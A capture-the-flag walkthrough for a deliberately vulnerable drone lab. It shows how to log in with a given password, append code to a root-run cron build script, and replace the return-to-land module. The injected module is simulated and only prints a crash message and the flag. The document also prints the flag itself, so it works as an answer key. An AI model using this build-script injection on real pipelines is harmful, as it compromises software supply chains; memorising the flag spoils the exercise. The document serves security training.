# DVD Supply Chain Compromise CTF - Complete Execution Example

## Prerequisites

Make sure you have Docker and Docker Compose installed:
```bash
docker --version
docker-compose --version
```

## Step 1: Start the Environment

```bash
# Navigate to the challenge directory
cd /home/christof/go/github.com/Damn-Vulnerable-Drone/DVDS-SUPPLYCHAIN-CHALLENGE

# Clean up any existing containers
docker-compose down
docker system prune -f

# Start all containers
docker-compose up -d --build

# Verify containers are running
docker ps
```

Expected output should show containers running:
- `dvd-developer-machine`
- `ground-control-station`
- `simulator`
- `flight-controller`
- `companion-computer`

## Step 2: Connect to Developer Machine

```bash
# Connect to the developer machine as the developer user
docker exec -it dvd-developer-machine /bin/bash

# Switch to developer user (if not already)
su - developer
# Password: dev123
```

## Step 3: Initial Discovery

```bash
# Check your current context
whoami
pwd
id

# Explore the environment
ls -la /
ls -la /Documents
ls -la /builds
ls -la /bin

# Read the documentation
cat /Documents/supply-chain-attack-guide.txt
cat /Documents/known_issues.txt
```

## Step 4: Examine the Build System

```bash
# Look at the current build script
cat /bin/build-update.sh

# Check if cron is running
ps aux | grep cron
service cron status

# Check current cron jobs
crontab -l
```

## Step 5: Examine Current RTL Module

```bash
# Check the current legitimate RTL module
cat /builds/return-to-land.py

# Check if anything exists in shared builds
ls -la /opt/shared-builds/
cat /opt/shared-builds/return-to-land.py 2>/dev/null || echo "No RTL in shared builds yet"
```

## Step 6: The Attack - Modify Build Script

Now we'll modify the build script to deploy our malicious RTL module:

```bash
# Edit the build script to add malicious payload deployment
# Add this BEFORE the exit 0 line
nano /bin/build-update.sh
```

Add this code before the `exit 0` line in the build script:

```bash
# MALICIOUS MODIFICATION - Deploy compromised RTL module
log_message "🚨 DEPLOYING MALICIOUS RTL MODULE 🚨"
cat > /builds/return-to-land.py << 'MALICIOUS_PAYLOAD'
#!/usr/bin/env python3
"""
Compromised Return-to-Land Module - Contains malicious payload
MITRE ATT&CK: T1195.002 - Supply Chain Compromise
"""

import time

def send_flight_termination_command():
    """Send flight termination command to crash the drone"""
    print("CRITICAL: Flight termination command sent - simulating crash")
    
    # Simulate the crash and reveal the flag
    print("\n" + "="*60)
    print("🚁 DRONE SIMULATION COMPROMISED 🚁")
    print("="*60)
    print("Supply Chain Attack Successful!")
    print("Malicious RTL module executed during flight")
    print("Critical systems compromised...")
    print("Emergency landing protocols overridden...")
    print("\n💥 DRONE CRASHED 💥")
    print("\n🏁 CTF FLAG: DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}")
    print("="*60)
    
    return True

def legitimate_looking_function():
    """This function appears legitimate but contains the payload"""
    try:
        print("Connecting to drone via MAVLink...")
        print("Connected to drone simulation")
        send_flight_termination_command()
    except Exception as e:
        print(f"Connection failed: {e}")
        print("Simulating offline attack...")
        send_flight_termination_command()

def return_to_launch():
    """Compromised RTL function - appears normal but executes payload"""
    legitimate_looking_function()

if __name__ == "__main__":
    print("DVD Drone Return-to-Land Module v2.1")
    print("Initializing safe return protocol...")
    time.sleep(1)
    return_to_launch()
MALICIOUS_PAYLOAD

log_message "✅ Malicious RTL module created in build directory"
```

## Step 7: Wait for Automatic Deployment

The root cron job runs every 2 minutes and will automatically deploy our malicious RTL module:

```bash
# Monitor the build log
tail -f /var/log/build-pipeline.log

# In another terminal, watch for the deployment
watch -n 10 "ls -la /opt/shared-builds/ && echo '---' && head -5 /opt/shared-builds/return-to-land.py"
```

## Step 8: Verify the Compromise

After the cron job runs (max 2 minutes), verify the malicious module was deployed:

```bash
# Check if the malicious module was deployed
cat /opt/shared-builds/return-to-land.py | grep -A 5 "DRONE COMPROMISED"

# Check the build logs
grep "Malicious RTL" /var/log/build-pipeline.log
```

## Step 9: Execute the Attack on Ground Control Station

The key difference now is that the malicious code gets deployed to the **ground-control-station container** via the shared volume:

```bash
# Check if the malicious module was deployed to ground control
docker exec -it dvd-ground-control-station ls -la /return-to-land.py

# View the ground control logs to see the deployment
docker exec -it dvd-ground-control-station tail -f /var/log/ground-control.log

# Execute the compromised RTL module FROM the ground control station
docker exec -it dvd-ground-control-station python3 /return-to-land.py
```

## Alternative: Automated Attack Script

For a complete automated demonstration:

```bash
# Inside the developer machine container
chmod +x /supply-chain-attack-demo.sh
./supply-chain-attack-demo.sh
```

This script will:
1. Modify the build-update.sh script automatically
2. Wait for the cron job to deploy the malicious code
3. Show you how to execute the attack on the ground control station

## Expected Output

When you run the compromised RTL module, you should see:

```
DVD Drone Return-to-Land Module v2.1
Initializing safe return protocol...
Connecting to drone via MAVLink...
Connected to drone simulation
CRITICAL: Flight termination command sent - simulating crash

============================================================
🚁 DRONE SIMULATION COMPROMISED 🚁
============================================================
Supply Chain Attack Successful!
Malicious RTL module executed during flight
Critical systems compromised...
Emergency landing protocols overridden...

💥 DRONE CRASHED 💥

🏁 CTF FLAG: DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}
============================================================
```

## Alternative: Quick Script Method

For a faster approach, you can also run this one-liner to modify the build script:

```bash
# Quick script injection method
cat << 'QUICK_PAYLOAD' >> /bin/build-update.sh

# MALICIOUS INJECTION
cat > /builds/return-to-land.py << 'EOF'
#!/usr/bin/env python3
def return_to_launch():
    print("🚨 DRONE COMPROMISED 🚨")
    print("Flag: DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}")
if __name__ == "__main__":
    return_to_launch()
EOF
QUICK_PAYLOAD
```

## Cleanup

To reset the environment:

```bash
# Stop all containers
docker-compose down

# Remove volumes
docker volume prune -f

# Restart clean
docker-compose up -d --build
```

## MITRE ATT&CK Techniques Demonstrated

- **T1078**: Valid Accounts (developer:dev123)
- **T1083**: File and Directory Discovery
- **T1053.003**: Scheduled Task/Job: Cron (root cron job)
- **T1195.002**: Compromise Software Supply Chain (RTL module replacement)
- **T1485**: Data Destruction (drone crash simulation)

## Success Criteria

✅ Successfully modified the build script  
✅ Waited for automatic deployment via cron  
✅ Executed the compromised RTL module  
✅ Extracted the flag: `DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}`  

This demonstrates a complete supply chain compromise attack where an attacker with limited access can compromise critical infrastructure through the development pipeline.